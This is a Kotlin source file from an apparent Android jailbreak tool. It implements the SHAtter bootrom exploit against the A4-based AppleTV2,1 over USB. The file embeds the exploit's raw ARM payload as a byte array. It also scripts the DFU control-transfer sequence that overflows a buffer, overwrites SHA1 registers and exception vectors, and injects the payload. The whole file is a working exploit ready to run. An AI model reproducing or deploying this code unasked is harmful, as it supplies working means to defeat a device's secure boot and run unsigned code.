package tv.blackb0x.droid

import android.hardware.usb.UsbDevice
import android.hardware.usb.UsbDeviceConnection
import android.hardware.usb.UsbManager

/**
 * SHAtter for AppleTV2,1 (A4 / CPID 0x8930). Port of DeviceManager::SHAtter
 * and the libirecovery USB helpers it calls. Payload is SHAtter.h verbatim.
 */
object Shatter {
    private val PAYLOAD = byteArrayOf(
        0x33.toByte(), 0x67.toByte(), 0x6d.toByte(), 0x49.toByte(), 0x58.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x44.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(),
        0x2c.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x73.toByte(), 0x73.toByte(), 0x62.toByte(), 0x69.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(),
        0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(),
        0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(),
        0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(),
        0x99.toByte(), 0xf1.toByte(), 0x02.toByte(), 0x84.toByte(), 0x48.toByte(), 0x53.toByte(), 0x48.toByte(), 0x53.toByte(), 0x0c.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(),
        0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x54.toByte(), 0x52.toByte(), 0x45.toByte(), 0x43.toByte(), 0x0c.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(),
        0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x20.toByte(), 0x4f.toByte(), 0xf0.toByte(), 0x3f.toByte(), 0x41.toByte(), 0x80.toByte(), 0x22.toByte(),
        0x48.toByte(), 0xf2.toByte(), 0xdc.toByte(), 0x43.toByte(), 0x98.toByte(), 0x47.toByte(), 0x52.toByte(), 0x48.toByte(), 0x52.toByte(), 0x49.toByte(), 0x4f.toByte(), 0xf4.toByte(),
        0xa0.toByte(), 0x72.toByte(), 0x48.toByte(), 0xf2.toByte(), 0xdc.toByte(), 0x43.toByte(), 0x98.toByte(), 0x47.toByte(), 0x47.toByte(), 0xf2.toByte(), 0x2d.toByte(), 0x13.toByte(),
        0x98.toByte(), 0x47.toByte(), 0x4f.toByte(), 0xf4.toByte(), 0xc9.toByte(), 0x43.toByte(), 0x98.toByte(), 0x47.toByte(), 0x79.toByte(), 0x46.toByte(), 0x04.toByte(), 0x39.toByte(),
        0x4c.toByte(), 0x48.toByte(), 0x88.toByte(), 0x42.toByte(), 0x07.toByte(), 0xd0.toByte(), 0x4f.toByte(), 0xf4.toByte(), 0x80.toByte(), 0x62.toByte(), 0x48.toByte(), 0xf2.toByte(),
        0xdc.toByte(), 0x43.toByte(), 0x98.toByte(), 0x47.toByte(), 0x48.toByte(), 0x4b.toByte(), 0x01.toByte(), 0x33.toByte(), 0x18.toByte(), 0x47.toByte(), 0x48.toByte(), 0x48.toByte(),
        0x0c.toByte(), 0x38.toByte(), 0x85.toByte(), 0x46.toByte(), 0x01.toByte(), 0x20.toByte(), 0x01.toByte(), 0x21.toByte(), 0x00.toByte(), 0x22.toByte(), 0x44.toByte(), 0xf6.toByte(),
        0x8d.toByte(), 0x63.toByte(), 0x98.toByte(), 0x47.toByte(), 0x00.toByte(), 0x20.toByte(), 0x46.toByte(), 0xf6.toByte(), 0x0d.toByte(), 0x13.toByte(), 0x98.toByte(), 0x47.toByte(),
        0x42.toByte(), 0x48.toByte(), 0x3a.toByte(), 0xa1.toByte(), 0x78.toByte(), 0x22.toByte(), 0x49.toByte(), 0xf2.toByte(), 0xc9.toByte(), 0x03.toByte(), 0x98.toByte(), 0x47.toByte(),
        0x44.toByte(), 0xf6.toByte(), 0x85.toByte(), 0x43.toByte(), 0x4f.toByte(), 0xf0.toByte(), 0x04.toByte(), 0x40.toByte(), 0x4f.toByte(), 0xf4.toByte(), 0x30.toByte(), 0x31.toByte(),
        0x98.toByte(), 0x47.toByte(), 0x04.toByte(), 0x1c.toByte(), 0x3c.toByte(), 0x49.toByte(), 0x08.toByte(), 0x68.toByte(), 0x00.toByte(), 0x22.toByte(), 0x0a.toByte(), 0x60.toByte(),
        0x43.toByte(), 0xf6.toByte(), 0x95.toByte(), 0x33.toByte(), 0x98.toByte(), 0x47.toByte(), 0x00.toByte(), 0x2c.toByte(), 0xee.toByte(), 0xdb.toByte(), 0x4f.toByte(), 0xf0.toByte(),
        0x04.toByte(), 0x45.toByte(), 0x28.toByte(), 0x68.toByte(), 0x37.toByte(), 0x49.toByte(), 0x88.toByte(), 0x42.toByte(), 0x0f.toByte(), 0xd1.toByte(), 0xa8.toByte(), 0x68.toByte(),
        0xe9.toByte(), 0x68.toByte(), 0x2a.toByte(), 0x69.toByte(), 0x6b.toByte(), 0x69.toByte(), 0xac.toByte(), 0x69.toByte(), 0x00.toByte(), 0x94.toByte(), 0xec.toByte(), 0x69.toByte(),
        0x01.toByte(), 0x94.toByte(), 0x2c.toByte(), 0x6a.toByte(), 0x02.toByte(), 0x94.toByte(), 0x6c.toByte(), 0x68.toByte(), 0xa0.toByte(), 0x47.toByte(), 0x68.toByte(), 0x60.toByte(),
        0x00.toByte(), 0x21.toByte(), 0x29.toByte(), 0x60.toByte(), 0xd8.toByte(), 0xe7.toByte(), 0x4f.toByte(), 0xf0.toByte(), 0x04.toByte(), 0x40.toByte(), 0x21.toByte(), 0x1c.toByte(),
        0x00.toByte(), 0x22.toByte(), 0x47.toByte(), 0xf2.toByte(), 0x69.toByte(), 0x43.toByte(), 0x98.toByte(), 0x47.toByte(), 0x00.toByte(), 0x28.toByte(), 0xcf.toByte(), 0xd0.toByte(),
        0x4f.toByte(), 0xf0.toByte(), 0x04.toByte(), 0x43.toByte(), 0x00.toByte(), 0x93.toByte(), 0x01.toByte(), 0x94.toByte(), 0x04.toByte(), 0x1c.toByte(), 0x69.toByte(), 0x46.toByte(),
        0x01.toByte(), 0xaa.toByte(), 0x00.toByte(), 0xf0.toByte(), 0x0c.toByte(), 0xf8.toByte(), 0x28.toByte(), 0xb9.toByte(), 0x4f.toByte(), 0xf0.toByte(), 0x04.toByte(), 0x41.toByte(),
        0x00.toByte(), 0x22.toByte(), 0x45.toByte(), 0xf6.toByte(), 0x5d.toByte(), 0x23.toByte(), 0x98.toByte(), 0x47.toByte(), 0x20.toByte(), 0x1c.toByte(), 0x47.toByte(), 0xf2.toByte(),
        0x51.toByte(), 0x43.toByte(), 0x98.toByte(), 0x47.toByte(), 0xba.toByte(), 0xe7.toByte(), 0xf0.toByte(), 0xb5.toByte(), 0x5e.toByte(), 0x46.toByte(), 0x55.toByte(), 0x46.toByte(),
        0x44.toByte(), 0x46.toByte(), 0x70.toByte(), 0xb4.toByte(), 0x06.toByte(), 0xaf.toByte(), 0x4f.toByte(), 0xf0.toByte(), 0x68.toByte(), 0x04.toByte(), 0x6d.toByte(), 0x46.toByte(),
        0x2d.toByte(), 0x1b.toByte(), 0xad.toByte(), 0x46.toByte(), 0x00.toByte(), 0x23.toByte(), 0x4f.toByte(), 0xf0.toByte(), 0x64.toByte(), 0x04.toByte(), 0x2c.toByte(), 0x19.toByte(),
        0x23.toByte(), 0x60.toByte(), 0x04.toByte(), 0x92.toByte(), 0x05.toByte(), 0x91.toByte(), 0x06.toByte(), 0x93.toByte(), 0x0e.toByte(), 0x68.toByte(), 0x8a.toByte(), 0x46.toByte(),
        0x9b.toByte(), 0x46.toByte(), 0x4f.toByte(), 0xf4.toByte(), 0x30.toByte(), 0x31.toByte(), 0x88.toByte(), 0x46.toByte(), 0x42.toByte(), 0x68.toByte(), 0x8a.toByte(), 0x42.toByte(),
        0x09.toByte(), 0xdc.toByte(), 0x90.toByte(), 0x46.toByte(), 0x20.toByte(), 0x1c.toByte(), 0x31.toByte(), 0x1c.toByte(), 0x44.toByte(), 0xf2.toByte(), 0x2d.toByte(), 0x14.toByte(),
        0xa0.toByte(), 0x47.toByte(), 0x04.toByte(), 0x1c.toByte(), 0x44.toByte(), 0xf2.toByte(), 0xdb.toByte(), 0x63.toByte(), 0x14.toByte(), 0xb1.toByte(), 0x01.toByte(), 0x24.toByte(),
        0x44.toByte(), 0xf2.toByte(), 0xdb.toByte(), 0x73.toByte(), 0x18.toByte(), 0x47.toByte(), 0xc0.toByte(), 0x46.toByte(), 0x20.toByte(), 0x50.toByte(), 0x57.toByte(), 0x4e.toByte(),
        0x44.toByte(), 0x3a.toByte(), 0x5b.toByte(), 0x53.toByte(), 0x48.toByte(), 0x41.toByte(), 0x74.toByte(), 0x74.toByte(), 0x65.toByte(), 0x72.toByte(), 0x5d.toByte(), 0x00.toByte(),
        0x00.toByte(), 0xc0.toByte(), 0x02.toByte(), 0x84.toByte(), 0x00.toByte(), 0xc0.toByte(), 0x00.toByte(), 0xbf.toByte(), 0x00.toByte(), 0x98.toByte(), 0x03.toByte(), 0x84.toByte(),
        0x00.toByte(), 0xc0.toByte(), 0x03.toByte(), 0x84.toByte(), 0xe0.toByte(), 0xe0.toByte(), 0x02.toByte(), 0x84.toByte(), 0xcc.toByte(), 0xdb.toByte(), 0x02.toByte(), 0x84.toByte(),
        0x63.toByte(), 0x65.toByte(), 0x78.toByte(), 0x65.toByte()
    )

    fun run(
        usb: UsbManager,
        open: () -> Pair<UsbDevice, UsbDeviceConnection>?,
        log: (String) -> Unit,
        progress: (Double) -> Unit,
    ): Boolean {
        fun reopen(): UsbDeviceConnection? {
            val pair = open() ?: return null
            AppleUsb.claim(pair.second, pair.first)
            return pair.second
        }

        log("Preparing buffer overflow")
        progress(5.0)
        var c = reopen() ?: return fail(log, "open failed")
        resetCounters(c)
        getData(c, 0x40)
        progress(15.0)
        c.close()

        log("Requesting validation")
        c = reopen() ?: return fail(log, "open after reset")
        requestImageValidation(c)
        c.close()

        log("Filling buffer with zeros")
        progress(25.0)
        c = reopen() ?: return fail(log, "open fill")
        getData(c, 0x2C000)
        progress(30.0)
        c.close()

        Thread.sleep(500)

        log("Overwriting SHA1 registers")
        progress(35.0)
        c = reopen() ?: return fail(log, "open sha1")
        resetCounters(c)
        progress(40.0)
        getData(c, 0x140)
        c.close()

        c = reopen() ?: return fail(log, "open validate2")
        progress(55.0)
        requestImageValidation(c)
        c.close()

        log("Sending SHAtter payload")
        c = reopen() ?: return fail(log, "open payload")
        progress(65.0)
        if (!sendBuffer(c, PAYLOAD, log)) {
            c.close()
            return false
        }
        progress(85.0)
        log("Overwriting exception vectors")
        getData(c, 0x2C000)
        progress(90.0)
        c.close()

        Thread.sleep(500)
        progress(100.0)
        log("SHAtter successful")
        return true
    }

    private fun fail(log: (String) -> Unit, msg: String): Boolean {
        log("SHAtter failed: $msg")
        return false
    }

    private fun resetCounters(c: UsbDeviceConnection) {
        c.controlTransfer(0x21, 4, 0, 0, null, 0, 1000)
    }

    private fun getData(c: UsbDeviceConnection, length: Int) {
        val packet = 0x800
        val buf = ByteArray(packet)
        var left = length
        while (left > 0) {
            val n = minOf(packet, left)
            c.controlTransfer(0xA1, 2, 0, 0, buf, n, 5000)
            left -= n
        }
    }

    private fun requestImageValidation(c: UsbDeviceConnection) {
        c.controlTransfer(0x21, 1, 0, 0, null, 0, 1000)
        val blank = ByteArray(16)
        c.controlTransfer(0xA1, 3, 0, 0, blank, 6, 1000)
        c.controlTransfer(0xA1, 3, 0, 0, blank, 6, 1000)
        c.controlTransfer(0xA1, 3, 0, 0, blank, 6, 1000)
    }

    private fun sendBuffer(c: UsbDeviceConnection, data: ByteArray, log: (String) -> Unit): Boolean {
        val packet = 0x800
        var sent = 0
        var block = 0
        while (sent < data.size) {
            val n = minOf(packet, data.size - sent)
            val chunk = data.copyOfRange(sent, sent + n)
            val r = c.controlTransfer(0x21, 1, block, 0, chunk, n, 5000)
            if (r != n) {
                log("payload send block $block r=$r")
                return false
            }
            val status = ByteArray(6)
            c.controlTransfer(0xA1, 3, 0, 0, status, 6, 1000)
            sent += n
            block++
        }
        c.controlTransfer(0x21, 1, block, 0, ByteArray(0), 0, 1000)
        val status = ByteArray(6)
        c.controlTransfer(0xA1, 3, 0, 0, status, 6, 1000)
        c.controlTransfer(0xA1, 3, 0, 0, status, 6, 1000)
        return true
    }
}
